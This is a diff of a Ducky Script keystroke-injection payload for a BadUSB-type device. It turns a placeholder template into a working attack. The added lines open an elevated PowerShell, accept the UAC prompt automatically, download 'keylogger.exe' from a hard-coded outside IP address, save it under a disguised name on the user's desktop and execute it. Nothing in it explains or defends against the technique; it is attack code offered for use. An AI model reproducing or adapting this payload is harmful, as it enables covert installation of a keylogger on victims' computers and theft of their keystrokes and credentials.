@@ -1,37 +1,11 @@
-DELAY 500
-
+DELAY 1000
 GUI r
 DELAY 500
-
-STRING powershell.exe
-DELAY 500
-
+STRING powershell Start-Process powershell -Verb runAs
 ENTER
+DELAY 1000
+ALT y
 DELAY 500
-
-STRING $WebClient = New-Object System.Net.WebClient
+STRING $down = New-Object System.Net.WebClient; $url = 'http://18.228.118.78/keylogger.exe'; $file = 'C:/Users/lufba/Desktop/soft.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
 DELAY 500
-
 ENTER
-DELAY 500
-
-STRING $WebClient.DownloadFile("ENDPOINT","PATH")
-DELAY 500
-
-ENTER
-DELAY 500
-
-STRING exit
-DELAY 500
-
-ENTER
-DELAY 500
-
-GUI r
-DELAY 500
-
-STRING PATH/file
-DELAY 500
-
-ENTER
-DELAY 500
